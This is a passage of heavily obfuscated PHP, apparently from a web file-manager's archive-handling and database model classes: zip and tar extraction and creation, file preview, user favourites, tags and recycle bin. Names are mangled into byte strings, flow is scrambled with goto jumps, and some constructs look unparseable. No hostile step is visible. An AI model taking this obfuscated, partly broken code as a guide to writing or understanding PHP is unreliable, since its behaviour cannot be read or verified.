$a‘“ô¾ÇÙ•[1025] => $a‘“ô¾ÇÙ•[1914]); goto A÷äµœÇ; B¬æ¯¼î“: $Cù…¯öôÆŠ = self::listContent($AõÀºŒ«õ÷, !1); if (!$Cù…¯öôÆŠ[$a‘“ô¾ÇÙ•[1023]]) { return $Cù…¯öôÆŠ; } if ($ašáÓšœˆç != $a‘“ô¾ÇÙ•[1022]) { goto FÕîäñÑ“; FÕîäñÑ“: $CßŒôô¹°² = self::fileIndex($Cù…¯öôÆŠ[$a‘“ô¾ÇÙ•[1025]], $ašáÓšœˆç); $fÌ™äèÇÅ¼ = str_replace(array($a‘“ô¾ÇÙ•[1062], $a‘“ô¾ÇÙ•[1910]), $a‘“ô¾ÇÙ•[80], $CßŒôô¹°²[$a‘“ô¾ÇÙ•[1908]]); $Aå¯º·Û°± = $fÌ™äèÇÅ¼; goto AØó³¤Æ†ß; AØó³¤Æ†ß: if ($GLOBALS[$a‘“ô¾ÇÙ•[6]][$a‘“ô¾ÇÙ•[1143]] != $a‘“ô¾ÇÙ•[339]) { $Aå¯º·Û°± = unzip_pre_name($fÌ™äèÇÅ¼); } $bÀÍÍ®ëª = get_path_father($fÌ™äèÇÅ¼); if ($bÀÍÍ®ëª == $fÌ™äèÇÅ¼) { $bÀÍÍ®ëª = $a‘“ô¾ÇÙ•[43]; } goto F†‹ÓñÄ¹; F†‹ÓñÄ¹: if ($CßŒôô¹°²[$a‘“ô¾ÇÙ•[86]]) { $Aå¯º·Û°± = rtrim($Aå¯º·Û°±, $a‘“ô¾ÇÙ•[8]) . $a‘“ô¾ÇÙ•[8]; $fÌ™äèÇÅ¼ = array($fÌ™äèÇÅ¼); } $A°ïØÍÊŸ = str_replace($a‘“ô¾ÇÙ•[103], $a‘“ô¾ÇÙ•[8], $Aå¯º·Û°±); if (substr($A°ïØÍÊŸ, -1) == $a‘“ô¾ÇÙ•[8]) { if (!strstr(trim($A°ïØÍÊŸ, $a‘“ô¾ÇÙ•[8]), $a‘“ô¾ÇÙ•[8])) { $F¤Ğ¢¦¼Ää = $F¤Ğ¢¦¼Ää . get_path_this($A°ïØÍÊŸ) . $a‘“ô¾ÇÙ•[8]; } } else { if ($bÀÍÍ®ëª == $Aå¯º·Û°±) { $bÀÍÍ®ëª = $a‘“ô¾ÇÙ•[43]; } } goto b’¢ˆƒ¡´ë; b’¢ˆƒ¡´ë: } goto DÆºˆËøˆ‘; eÒÃŞÓ–µ‹: $a‘“ô¾ÇÙ• =& $_SERVER[¨¤¼…´]; self::init(); $b“Ë Ä´Ö¬ = !empty($GLOBALS[$a‘“ô¾ÇÙ•[1039]]) ? $GLOBALS[$a‘“ô¾ÇÙ•[1039]] : get_path_ext($AõÀºŒ«õ÷); goto B¬æ¯¼î“; A÷äµœÇ: } static function fileIndex($b¼ö´ùá, $A†›İĞ£, $D®°©»œãä = false) { goto B²‡¬“Õğì; EŠ£ïÕ–ßù: $C”ç–»‡ÓÒ = count($b¼ö´ùá); for ($cã¬•—ù‹È = 0; $cã¬•—ù‹È < $C”ç–»‡ÓÒ; $cã¬•—ù‹È++) { if ($A†›İĞ£ == $b¼ö´ùá[$cã¬•—ù‹È][$CŠ‘‹ë‘ìÛ[1027]]) { $B‚ óµù…Ø = $b¼ö´ùá[$cã¬•—ù‹È]; break; } } if (!$B‚ óµù…Ø) { show_tips($CŠ‘‹ë‘ìÛ[1915]); } goto c§Ï¤ÜÚˆ; c§Ï¤ÜÚˆ: $DË™”Æ¼Ú = $B‚ óµù…Ø; if ($D®°©»œãä) { $DË™”Æ¼Ú = $B‚ óµù…Ø[$D®°©»œãä]; if ($B‚ óµù…Ø[$CŠ‘‹ë‘ìÛ[86]]) { $DË™”Æ¼Ú = rtrim($DË™”Æ¼Ú, $CŠ‘‹ë‘ìÛ[8]) . $CŠ‘‹ë‘ìÛ[8]; } } return $DË™”Æ¼Ú; goto B—Ò·™…ñ; B²‡¬“Õğì: $CŠ‘‹ë‘ìÛ =& $_SERVER[¨¤¼…´]; self::init(); if (!is_array($b¼ö´ùá)) { return !1; } goto EŠ£ïÕ–ßù; B—Ò·™…ñ: } static function extractZipFile($d‚æŞ‚ñƒ, $E«Ø‰‘ƒ™é, $a‹ïŞŒ£·± = false) { goto a‡ñ¯áÃ„Š; bµë‘³³: if (file_exists($f¿´ÔøÏ“)) { return $f¿´ÔøÏ“; } $AùØÆÆ ®„ = new PclZip($d‚æŞ‚ñƒ); $DÌîÖ­ˆ·Œ = unzip_filter_ext($Cëé–àÁ‡î . get_path_this($E«Ø‰‘ƒ™é)); goto E´‚œ®Ë×›; c¹ÈÚ”Ñµ: mk_dir($Cëé–àÁ‡î); $f¿´ÔøÏ“ = $Cëé–àÁ‡î . md5($d‚æŞ‚ñƒ . $E«Ø‰‘ƒ™é); if ($a‹ïŞŒ£·±) { $f¿´ÔøÏ“ = $Cëé–àÁ‡î . $a‹ïŞŒ£·±; } goto bµë‘³³; E´‚œ®Ë×›: $Bßğ¹«Ô³ù = get_path_father($E«Ø‰‘ƒ™é); if ($Bßğ¹«Ô³ù == $E«Ø‰‘ƒ™é) { $Bßğ¹«Ô³ù = $AçÑ‰ ¨°[43]; } $c—Š¼Î«Ğô = $AùØÆÆ ®„->extract(PCLZIP_OPT_PATH, $Cëé–àÁ‡î, PCLZIP_CB_PRE_FILE_NAME, $AçÑ‰ ¨°[1913], PCLZIP_OPT_REMOVE_PATH, $Bßğ¹«Ô³ù, PCLZIP_OPT_BY_NAME, $E«Ø‰‘ƒ™é); goto d¥˜‡ÍĞòØ; a‡ñ¯áÃ„Š: $AçÑ‰ ¨° =& $_SERVER[¨¤¼…´]; self::init(); $Cëé–àÁ‡î = TEMP_FILES . hash_path($d‚æŞ‚ñƒ) . $AçÑ‰ ¨°[8]; goto c¹ÈÚ”Ñµ; d¥˜‡ÍĞòØ: if (!file_exists($DÌîÖ­ˆ·Œ)) { return !1; } @rename($DÌîÖ­ˆ·Œ, $f¿´ÔøÏ“); return $f¿´ÔøÏ“; goto DÉ’šİÄ‘; DÉ’šİÄ‘: } static function filePreview($B¦Çƒ²‚ÇÀ, $BÓÊ®°•‰ñ, $B®¾Š„ô… = false, $cŞŸ¡–“‘º = false) { goto A–õ‹„™Œ; A–õ‹„™Œ: $aºì©ø×ç… =& $_SERVER[¨¤¼…´]; self::init(); $A’ùÊòÖÃ¥ = TEMP_FILES . hash_path($B¦Çƒ²‚ÇÀ) . $aºì©ø×ç…[8]; goto eÂßòÜºÌ; eÂßòÜºÌ: mk_dir($A’ùÊòÖÃ¥); $c«Ù–Æ¶ˆ = $A’ùÊòÖÃ¥ . md5($B¦Çƒ²‚ÇÀ . $BÓÊ®°•‰ñ . $cŞŸ¡–“‘º); $e–ì‘Ş¾Õ = $aºì©ø×ç…[43]; goto Aµ‡²×¡Ìš; eêÄ˜¦ìƒÁ: if (!file_exists($c«Ù–Æ¶ˆ)) { del_dir($A’ùÊòÖÃ¥); show_json($aºì©ø×ç…[1918]); } IO::fileOut($c«Ù–Æ¶ˆ, $B®¾Š„ô…, $aó†ñÂÊ‰ó); goto bôíéòó‹·; BİÜŒöÄà: if (!$dè«©ì‡·[$aºì©ø×ç…[1023]]) { show_json($dè«©ì‡·[$aºì©ø×ç…[1025]], !1); } if (!file_exists($c©‰ŒæÙ»ğ)) { show_json($aºì©ø×ç…[1917], !1); } @rename($c©‰ŒæÙ»ğ, $c«Ù–Æ¶ˆ); goto eêÄ˜¦ìƒÁ; Aµ‡²×¡Ìš: $dè«©ì‡· = self::extract($B¦Çƒ²‚ÇÀ, $A’ùÊòÖÃ¥, $BÓÊ®°•‰ñ, $e–ì‘Ş¾Õ); if (is_array($e–ì‘Ş¾Õ)) { show_json($aºì©ø×ç…[1916], !1); } if (file_exists($c«Ù–Æ¶ˆ)) { IO::fileOut($c«Ù–Æ¶ˆ, $B®¾Š„ô…, get_path_this($e–ì‘Ş¾Õ)); return; } goto E†¢ŞšÁª; E†¢ŞšÁª: $e–ì‘Ş¾Õ = unzip_pre_name($e–ì‘Ş¾Õ); $aó†ñÂÊ‰ó = get_path_this($e–ì‘Ş¾Õ); $c©‰ŒæÙ»ğ = unzip_filter_ext($A’ùÊòÖÃ¥ . $aó†ñÂÊ‰ó); goto BİÜŒöÄà; bôíéòó‹·: } static function create($FÅ×œõË™Ø, $Dì‚é‘ÛÆÍ) { $EŸ‡öï‘Ôñ =& $_SERVER[¨¤¼…´]; self::init(); $bãæíĞ¦® = get_path_ext($FÅ×œõË™Ø); $a©åè“…Í¬ = !1; if (self::checkIfType($bãæíĞ¦®, $EŸ‡öï‘Ôñ[314])) { if (kodZipArchive::support($EŸ‡öï‘Ôñ[998])) { return kodZipArchive::create($FÅ×œõË™Ø, $Dì‚é‘ÛÆÍ); } $bÁ¢Â˜“Íâ = new PclZip($FÅ×œõË™Ø); foreach ($Dì‚é‘ÛÆÍ as $a×ìâ ÎÊ => $c‹²ğôÈÖ) { $c‹²ğôÈÖ = str_replace($EŸ‡öï‘Ôñ[480], $EŸ‡öï‘Ôñ[8], $c‹²ğôÈÖ); $fÃ½±Òœ›Ñ = Kodio::clear(get_path_father($c‹²ğôÈÖ)); if ($a×ìâ ÎÊ == 0) { $a©åè“…Í¬ = $bÁ¢Â˜“Íâ->create($c‹²ğôÈÖ, PCLZIP_OPT_REMOVE_PATH, $fÃ½±Òœ›Ñ, PCLZIP_CB_PRE_FILE_NAME, $EŸ‡öï‘Ôñ[1919]); continue; } $a©åè“…Í¬ = $bÁ¢Â˜“Íâ->add($c‹²ğôÈÖ, PCLZIP_OPT_REMOVE_PATH, $fÃ½±Òœ›Ñ, PCLZIP_CB_PRE_FILE_NAME, $EŸ‡öï‘Ôñ[1919]); } } else { if (self::checkIfType($bãæíĞ¦®, $EŸ‡öï‘Ôñ[1890])) { foreach ($Dì‚é‘ÛÆÍ as $a×ìâ ÎÊ => $c‹²ğôÈÖ) { $c‹²ğôÈÖ = str_replace($EŸ‡öï‘Ôñ[480], $EŸ‡öï‘Ôñ[8], $c‹²ğôÈÖ); $fÃ½±Òœ›Ñ = Kodio::clear(get_path_father($c‹²ğôÈÖ)); if ($a×ìâ ÎÊ == 0) { $a©åè“…Í¬ = PclTarCreate($FÅ×œõË™Ø, array($c‹²ğôÈÖ), $bãæíĞ¦®, null, $fÃ½±Òœ›Ñ); continue; } $a©åè“…Í¬ = PclTarAddList($FÅ×œõË™Ø, array($c‹²ğôÈÖ), $EŸ‡öï‘Ôñ[43], $fÃ½±Òœ›Ñ, $bãæíĞ¦®); } } } return $a©åè“…Í¬; } } goto b³È•—–¦; DÛá÷«ƒ…ì: class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($fõƒÏÆÓ´ = false, $f©Áê™æ¼Ê = '', $a“ÜÏÈó¤‹ = false) { goto aÜË§Şª•é; aÜË§Şª•é: $eĞœéŠáÔä =& $_SERVER[¨¤¼…´]; $b°£¤•Å… = $this->cacheGet($f©Áê™æ¼Ê); $aÀš’‡Ï‹ = $this->optionDefault($f©Áê™æ¼Ê); goto aÍÙƒßÇ; Fõâ†ê†ñÆ: $this->cacheSet($f©Áê™æ¼Ê, $b°£¤•Å…); $b°£¤•Å… = array_merge($aÀš’‡Ï‹, $b°£¤•Å…); return $fõƒÏÆÓ´ ? $b°£¤•Å…[$fõƒÏÆÓ´] : $b°£¤•Å…; goto Cã’ïâ¯¸«; aÍÙƒßÇ: $aÀš’‡Ï‹ = is_array($aÀš’‡Ï‹) ? $aÀš’‡Ï‹ : array(); if (is_array($b°£¤•Å…)) { $b°£¤•Å… = array_merge($aÀš’‡Ï‹, $b°£¤•Å…); return $fõƒÏÆÓ´ ? isset($b°£¤•Å…[$fõƒÏÆÓ´]) ? $b°£¤•Å…[$fõƒÏÆÓ´] : null : $b°£¤•Å…; } $a¹î¿ùÑ×º = $this->filterWhere(array($eĞœéŠáÔä[39] => $f©Áê™æ¼Ê)); goto fÁØÜŒ½Ô; fÁØÜŒ½Ô: $b°£¤•Å… = $this->where($a¹î¿ùÑ×º)->select(); $b°£¤•Å… = array_to_keyvalue($b°£¤•Å…, $eĞœéŠáÔä[99], $eĞœéŠáÔä[372]); foreach ($b°£¤•Å… as $BÆ˜ƒëõ×Œ => $B‘ğˆ¤à†) { if ($a“ÜÏÈó¤‹ || in_array($BÆ˜ƒëõ×Œ, $this->jsonField)) { $b°£¤•Å…[$BÆ˜ƒëõ×Œ] = json_decode($B‘ğˆ¤à†, !0); } } goto Fõâ†ê†ñÆ; Cã’ïâ¯¸«: } public function set($eôµĞó­¨¢, $fèãá®øè = false, $e¬¨È“¿Á = '') { goto càŠ›¤òò; Aƒ‡£˜¿Ã: return $this->addAll($E½©ƒ’…Ë, array(), !0); goto CßƒÇĞÌ¿; càŠ›¤òò: $BŞõ›Öô =& $_SERVER[¨¤¼…´]; $this->cacheRemove($e¬¨È“¿Á); $E½©ƒ’…Ë = array(); goto A°¦°Å£’ˆ; A°¦°Å£’ˆ: $aùìÓšìÎë = is_array($eôµĞó­¨¢) ? $eôµĞó­¨¢ : array($eôµĞó­¨¢ => $fèãá®øè); foreach ($aùìÓšìÎë as $cå‘£»ÙÈŒ => $Eºøéåœµô) { if (is_array($Eºøéåœµô)) { $Eºøéåœµô = json_encode_force($Eºøéåœµô); } $this->checkLength($Eºøéåœµô, !1, $this->tableName . $BŞõ›Öô[4] . $eôµĞó­¨¢); $Eºøéåœµô = self::textEncode($Eºøéåœµô); $aùìÓšìÎë = array($BŞõ›Öô[39] => $e¬¨È“¿Á, $BŞõ›Öô[99] => $cå‘£»ÙÈŒ, $BŞõ›Öô[372] => $Eºøéåœµô); $E½©ƒ’…Ë[] = $this->filterWhere($aùìÓšìÎë); } if (!$E½©ƒ’…Ë) { return !0; } goto Aƒ‡£˜¿Ã; CßƒÇĞÌ¿: } protected function optionDefault($cÃŞÍÊ‚ = '') { return !1; } public function setDeep($dõç©ÌÛ, $DĞºÅ“¾”Í = false, $fĞÄï‚â½ò = '') { $eİÂÅÄÉí“ = explode($_SERVER[¨¤¼…´][101], $dõç©ÌÛ); $C¬òºåÅñˆ = $this->get(); array_set_value($C¬òºåÅñˆ, $dõç©ÌÛ, $DĞºÅ“¾”Í); $this->set($eİÂÅÄÉí“[0], $C¬òºåÅñˆ[$eİÂÅÄÉí“[0]], $fĞÄï‚â½ò); } public function remove($dŠ˜—˜êŒÇ, $Báä¦ñÚİ° = '') { $eªâáˆ­‰‡ =& $_SERVER[¨¤¼…´]; $this->cacheRemove($Báä¦ñÚİ°); $EÂõ„°öï‘ = $this->filterWhere(array($eªâáˆ­‰‡[99] => $dŠ˜—˜êŒÇ, $eªâáˆ­‰‡[39] => $Báä¦ñÚİ°)); if (is_null($dŠ˜—˜êŒÇ)) { unset($EÂõ„°öï‘[$eªâáˆ­‰‡[99]]); } return $this->where($EÂõ„°öï‘)->delete(); } public function cacheSet($A‡ËŞÂµªÆ, $CÇ¶ùùŠŸ» = false) { return Cache::set($this->cacheKey($A‡ËŞÂµªÆ), $CÇ¶ùùŠŸ»); } public function cacheGet($DÁãÉÀËëì) { return Cache::get($this->cacheKey($DÁãÉÀËëì)); } public function cacheRemove($d‰ÔŞ•Íè) { return Cache::remove($this->cacheKey($d‰ÔŞ•Íè)); } protected function filterWhere($Eè¾Ô©ğ†) { return $Eè¾Ô©ğ†; } protected function cacheKey($DõáËö¼×£) { return $DõáËö¼×£; } } class SourceListModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\163\x6f\165\x72\143\x65"; protected $tableMeta = array("\x74\x61\x62\x6c\145\116\x61\x6d\x65" => "\x69\x6f\x5f\x73\x6f\165\162\x63\145\x5f\155\145\164\x61", "\x6d\x65\x74\x61\106\x69\x65\x6c\x64" => "\163\x6f\165\162\143\145\x49\x44"); protected $dataAuto = array(array("\155\x6f\x64\x69\146\x79\124\151\x6d\145", "\x74\x69\155\x65", "\151\156\163\x65\x72\164", "\146\165\x6e\143\x74\x69\157\x6e"), array("\143\162\x65\141\x74\145\124\151\x6d\145", "\164\x69\x6d\x65", "\151\156\x73\145\x72\164", "\146\165\x6e\x63\164\151\x6f\x6e"), array("\x76\151\x65\x77\124\151\155\145", "\x74\x69\155\x65", "\x69\156\163\x65\162\164", "\x66\x75\x6e\143\164\151\157\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($C¾ì®¤¿’´) { return $this->listSource(array($_SERVER[¨¤¼…´][380] => $C¾ì®¤¿’´)); } public function typeName($eÄíïëÄ…Ç) { static $F±º¿ğå£× = array(self::TYPE_SYSTEM => "\163\x79\x73\x74\x65\155", self::TYPE_USER => "\165\x73\145\162", self::TYPE_GROUP => "\147\162\x6f\165\160"); return $F±º¿ğå£×[$eÄíïëÄ…Ç . $_SERVER[¨¤¼…´][43]]; } public function sourceListInfo($Cùá†‚÷îö, $e¡ÕÇ­›Ò = false) { goto f…ôß£·†¤; f…ôß£·†¤: $dç½‚ÎÀÑ× =& $_SERVER[¨¤¼…´]; $Cùá†‚÷îö = $Cùá†‚÷îö ? $Cùá†‚÷îö : array(); $Cùá†‚÷îö = array_filter(array_unique($Cùá†‚÷îö)); goto EŒ¶™ƒÎ÷ˆ; A‘³”è¿ÛÍ: return array_to_keyvalue($b†¬Ø…İƒ÷, $dç½‚ÎÀÑ×[381]); goto EÕ §ŸĞÔª; EŒ¶™ƒÎ÷ˆ: if (!$Cùá†‚÷îö) { return array(); } $b†¬Ø…İƒ÷ = $this->where(array($dç½‚ÎÀÑ×[381] => array($dç½‚ÎÀÑ×[7], $Cùá†‚÷îö)))->select(); $this->_listDataApply($b†¬Ø…İƒ÷, $e¡ÕÇ­›Ò); goto A‘³”è¿ÛÍ; EÕ §ŸĞÔª: } public function pathInfoFilter($bâ÷––ô…¥) { goto b‚–ÄÉ¹ÌÀ; b‘­Ù›ŸŒ : $c‰è’ŒÃã© .= $c¯ÏƒÎ«”[386]; $c‰è’ŒÃã© .= $c¯ÏƒÎ«”[387]; $a–§§¦Éøø = explode($c¯ÏƒÎ«”[57], $c‰è’ŒÃã©); goto F­‚ˆíÈÖ; b‚–ÄÉ¹ÌÀ: $c¯ÏƒÎ«” =& $_SERVER[¨¤¼…´]; $bâ÷––ô…¥[$c¯ÏƒÎ«”[85]] = KodIO::make($bâ÷––ô…¥[$c¯ÏƒÎ«”[381]]); $bâ÷––ô…¥[$c¯ÏƒÎ«”[39]] = $bâ÷––ô…¥[$c¯ÏƒÎ«”[382]] == 1 ? $c¯ÏƒÎ«”[86] : $c¯ÏƒÎ«”[181]; goto CòÄ¤‹Ë‘ñ; F­‚ˆíÈÖ: if (isset($bâ÷––ô…¥[$c¯ÏƒÎ«”[388]]) && $bâ÷––ô…¥[$c¯ÏƒÎ«”[388]][$c¯ÏƒÎ«”[389]] == -1) { $a–§§¦Éøø = array_remove_value($a–§§¦Éøø, $c¯ÏƒÎ«”[201]); $a–§§¦Éøø = array_remove_value($a–§§¦Éøø, $c¯ÏƒÎ«”[117]); $a–§§¦Éøø = array_remove_value($a–§§¦Éøø, $c¯ÏƒÎ«”[390]); $a–§§¦Éøø = array_remove_value($a–§§¦Éøø, $c¯ÏƒÎ«”[391]); $a–§§¦Éøø = array_remove_value($a–§§¦Éøø, $c¯ÏƒÎ«”[87]); $a–§§¦Éøø = array_remove_value($a–§§¦Éøø, $c¯ÏƒÎ«”[392]); } $bâ÷––ô…¥ = array_field_key($bâ÷––ô…¥, $a–§§¦Éøø); return $bâ÷––ô…¥; goto B¥Øß“£¢œ; CòÄ¤‹Ë‘ñ: $bâ÷––ô…¥[$c¯ÏƒÎ«”[383]] = $this->typeName($bâ÷––ô…¥[$c¯ÏƒÎ«”[383]]); if ($bâ÷––ô…¥[$c¯ÏƒÎ«”[382]] != 1) { $bâ÷––ô…¥[$c¯ÏƒÎ«”[175]] = $bâ÷––ô…¥[$c¯ÏƒÎ«”[384]]; unset($bâ÷––ô…¥[$c¯ÏƒÎ«”[384]]); } $c‰è’ŒÃã© = $c¯ÏƒÎ«”[385]; goto b‘­Ù›ŸŒ ; B¥Øß“£¢œ: } public function listUserFav() { goto b„Ó«¨—³ˆ; b„Ó«¨—³ˆ: $fôê„Ş‘‰­ =& $_SERVER[¨¤¼…´]; $Céé“êí‹± = Model($fôê„Ş‘‰­[393])->listData(); $eîµë´¬ˆ÷ = array_filter_by_field($Céé“êí‹±, $fôê„Ş‘‰­[39], $fôê„Ş‘‰­[394]); goto BÍ˜ÇÄÄæ¹; BÍ˜ÇÄÄæ¹: $eîµë´¬ˆ÷ = array_to_keyvalue($eîµë´¬ˆ÷, $fôê„Ş‘‰­[43], $fôê„Ş‘‰­[85]); if ($eîµë´¬ˆ÷) { $B½°ÕÛËª© = $this->listSource(array($fôê„Ş‘‰­[395] => array($fôê„Ş‘‰­[396], $eîµë´¬ˆ÷))); } $B½°ÕÛËª© = array_to_keyvalue($B½°ÕÛËª©[$fôê„Ş‘‰­[367]], $fôê„Ş‘‰­[381]); goto cƒñ‹Â¿Ë; cƒñ‹Â¿Ë: foreach ($Céé“êí‹± as &$CÇ…õ²ÈÁÇ) { $CÇ…õ²ÈÁÇ = array($fôê„Ş‘‰­[397] => $CÇ…õ²ÈÁÇ[$fôê„Ş‘‰­[379]], $fôê„Ş‘‰­[398] => $CÇ…õ²ÈÁÇ[$fôê„Ş‘‰­[38]], $fôê„Ş‘‰­[399] => $CÇ…õ²ÈÁÇ[$fôê„Ş‘‰­[85]], $fôê„Ş‘‰­[400] => $CÇ…õ²ÈÁÇ[$fôê„Ş‘‰­[39]], $fôê„Ş‘‰­[401] => $CÇ…õ²ÈÁÇ[$fôê„Ş‘‰­[201]], $fôê„Ş‘‰­[402] => $CÇ…õ²ÈÁÇ[$fôê„Ş‘‰­[117]]); if ($CÇ…õ²ÈÁÇ[$fôê„Ş‘‰­[39]] == $fôê„Ş‘‰­[394] && $B½°ÕÛËª©[$CÇ…õ²ÈÁÇ[$fôê„Ş‘‰­[85]]]) { $CÇ…õ²ÈÁÇ[$fôê„Ş‘‰­[403]] = $B½°ÕÛËª©[$CÇ…õ²ÈÁÇ[$fôê„Ş‘‰­[85]]]; } } unset($CÇ…õ²ÈÁÇ); return $Céé“êí‹±; goto féµ¦ˆÉòŒ; féµ¦ˆÉòŒ: } public function listUserTag($CÀÍ³é”) { goto fôŒ²â¨§¡; b¶é©ˆËÍÍ: foreach ($bÀïä£å as $b¹•„áóõ => $aÜ‘Âéèğà) { $aÚ‘çÇÈš = !0; if (!$CÀÍ³é”) { $F›‰ô•Ûöß[] = $b¹•„áóõ; continue; } foreach ($CÀÍ³é” as $a¶´˜Ş¿¨§) { if (!in_array($a¶´˜Ş¿¨§, $aÜ‘Âéèğà)) { $aÚ‘çÇÈš = !1; break; } } if ($aÚ‘çÇÈš) { $F›‰ô•Ûöß[] = $b¹•„áóõ; } } if (!$F›‰ô•Ûöß) { return array(); } $d®¬¦ÖÓ¹ä = $this->listSource(array($C¨å§Ùˆ[395] => array($C¨å§Ùˆ[396], $F›‰ô•Ûöß))); goto C—¨§†ÇÖ; fæ£×çğ«ã: if ($Fìé‹ÓÀ) { Model($C¨å§Ùˆ[406])->removeBySource($Fìé‹ÓÀ); } return $d®¬¦ÖÓ¹ä; goto c²³™–¶Ã; FÆ»Úâ‡«ß: $bÀïä£å = array(); foreach ($C×ã®Ç­ as $D¾“Ş‹Ù¤) { $aÀ¤ÂË†Õ¼ = $D¾“Ş‹Ù¤[$C¨å§Ùˆ[85]]; if (!$aÀ¤ÂË†Õ¼) { continue; } if (!isset($bÀïä£å[$aÀ¤ÂË†Õ¼])) { $bÀïä£å[$aÀ¤ÂË†Õ¼] = array(); } $bÀïä£å[$aÀ¤ÂË†Õ¼][] = $D¾“Ş‹Ù¤[$C¨å§Ùˆ[405]]; } $F›‰ô•Ûöß = array(); goto b¶é©ˆËÍÍ; fôŒ²â¨§¡: $C¨å§Ùˆ =& $_SERVER[¨¤¼…´]; if ($CÀÍ³é” && !is_array($CÀÍ³é”)) { $CÀÍ³é” = array($CÀÍ³é”); } $C×ã®Ç­ = Model($C¨å§Ùˆ[404])->listData(); goto FÆ»Úâ‡«ß; B‡Öç‘¿Å: $cÜ­ªÜ‰ÛË = array_to_keyvalue($d®¬¦ÖÓ¹ä[$C¨å§Ùˆ[83]], $C¨å§Ùˆ[43], $C¨å§Ùˆ[381]); $eáŒ©¼öê = array_merge($cÜ­ªÜ‰ÛË, $bÉ˜Ë¿ƒ¾»); foreach ($F›‰ô•Ûöß as $aÀ¤ÂË†Õ¼) { if (!in_array($aÀ¤ÂË†Õ¼, $eáŒ©¼öê)) { $Fìé‹ÓÀ[] = $aÀ¤ÂË†Õ¼; } } goto fæ£×çğ«ã; C—¨§†ÇÖ: if (!$d®¬¦ÖÓ¹ä || count($F›‰ô•Ûöß) == $d®¬¦ÖÓ¹ä[$C¨å§Ùˆ[364]][$C¨å§Ùˆ[365]]) { return $d®¬¦ÖÓ¹ä; } $Fìé‹ÓÀ = array(); $bÉ˜Ë¿ƒ¾» = array_to_keyvalue($d®¬¦ÖÓ¹ä[$C¨å§Ùˆ[84]], $C¨å§Ùˆ[43], $C¨å§Ùˆ[381]); goto B‡Öç‘¿Å; c²³™–¶Ã: } public function listUserRecycle() { $Bï£†É‰õ =& $_SERVER[¨¤¼…´]; $D£íåš©‹š = Model($Bï£†É‰õ[407])->listData(); if (!$D£íåš©‹š) { return array(); } $Dâ´ªğœŞ¢ = array($Bï£†É‰õ[395] => array($Bï£†É‰õ[396], $D£íåš©‹š), $Bï£†É‰õ[408] => 1); return $this->listSource($Dâ´ªğœŞ¢); } public function listSource($e•ğ–ÜªĞƒ, $d‡¹Æ®Ó´Õ = 3000) { goto DÄ™ÑªÂ„; A¦ùæî­Úø: $C¢ğ”ö·©× = $this->field($aªªÜ‰¥øÔ)->_makeOrder()->where($e•ğ–ÜªĞƒ)->selectPage($d‡¹Æ®Ó´Õ); $this->_listDataApply($C¢ğ”ö·©×[$cÃëù·ïÚ[367]]); $this->_listMake($C¢ğ”ö·©×); goto d÷¤àòØó; d÷¤àòØó: return $C¢ğ”ö·©×; goto f½æ³‡Í‘ó; DÄ™ÑªÂ„: $cÃëù·ïÚ =& $_SERVER[¨¤¼…´]; if (!isset($e•ğ–ÜªĞƒ[$cÃëù·ïÚ[409]])) { $e•ğ–ÜªĞƒ[$cÃëù·ïÚ[409]] = 0; } $aªªÜ‰¥øÔ = $cÃëù·ïÚ[410]; goto A¦ùæî­Úø; f½æ³‡Í‘ó: } protected function _makeOrder() { goto Dù”á°ŞëÅ; Dù”á°ŞëÅ: $dÜê–åÌë² =& $_SERVER[¨¤¼…´]; $f„ÅÛ’¼¼Ñ = Model($dÜê–åÌë²[411])->get($dÜê–åÌë²[412]); $D…’£ÁĞä® = Model($dÜê–åÌë²[411])->get($dÜê–åÌë²[413]); goto Aßëá¤ˆª‰; Aßëá¤ˆª‰: $eŞ¸ Œ¾´ˆ = array($dÜê–åÌë²[414] => $dÜê–åÌë²[415], $dÜê–åÌë²[416] => $dÜê–åÌë²[417]); $dòÔ¬µÜ‰ = array($dÜê–åÌë²[38] => $dÜê–åÌë²[38], $dÜê–åÌë²[87] => $dÜê–åÌë²[87], $dÜê–åÌë²[175] => $dÜê–åÌë²[384], $dÜê–åÌë²[390] => $dÜê–åÌë²[390], $dÜê–åÌë²[418] => $dÜê–åÌë²[391], $dÜê–åÌë²[201] => $dÜê–åÌë²[201], $dÜê–åÌë²[117] => $dÜê–åÌë²[117]); $CìÌë‡ˆõ” = Input::get($dÜê–åÌë²[419], $dÜê–åÌë²[7], $f„ÅÛ’¼¼Ñ, array_keys($dòÔ¬µÜ‰)); goto A²ä³¢ŠÃ©; A²ä³¢ŠÃ©: $eå‹ñÅÄá = Input::get($dÜê–åÌë²[420], $dÜê–åÌë²[7], $D…’£ÁĞä®, array_keys($eŞ¸ Œ¾´ˆ)); if (!in_array($CìÌë‡ˆõ”, array_keys($dòÔ¬µÜ‰))) { $CìÌë‡ˆõ” = $dÜê–åÌë²[38]; } if (!in_array($eå‹ñÅÄá, array_keys($eŞ¸ Œ¾´ˆ))) { $CìÌë‡ˆõ” = $dÜê–åÌë²[414]; } goto FåŠøíÃİ; FåŠøíÃİ: if ($CìÌë‡ˆõ” == $dÜê–åÌë²[38]) { } $CŞ—‰Ââ¶ù = $dÜê–åÌë²[421] . $dòÔ¬µÜ‰[$CìÌë‡ˆõ”] . $dÜê–åÌë²[60] . $eŞ¸ Œ¾´ˆ[$eå‹ñÅÄá]; return $this->order(rtrim(trim($CŞ—‰Ââ¶ù), $dÜê–åÌë²[57])); goto aè”®Ö±­Š; aè”®Ö±­Š: } protected function _listDataApplyItem($A°·À­ìŒ‘, $Aô¥¹ÖÄ½ = false) { $a†÷™¢‡× = array($A°·À­ìŒ‘); $this->_listDataApply($a†÷™¢‡×, $Aô¥¹ÖÄ½); return $a†÷™¢‡×[0]; } protected function _listDataApply(&$F›®……¿ì, $F¿Ş©¸ªä® = false) { goto E¡ò³›ØŠÂ; E¡ò³›ØŠÂ: $cø·øÇ­âé =& $_SERVER[¨¤¼…´]; if (!$F›®……¿ì) { $F›®……¿ì = array(); return; } $c¸ê ßíÑ« = array_to_keyvalue($F›®……¿ì, $cø·øÇ­âé[43], $cø·øÇ­âé[381]); goto CæÙ›² —; CæÙ›² —: $c¸ê ßíÑ« = array_unique($c¸ê ßíÑ«); $this->_listSourceCache($F›®……¿ì); if (!$F¿Ş©¸ªä®) { $this->_listAppendMeta($F›®……¿ì, $c¸ê ßíÑ«); 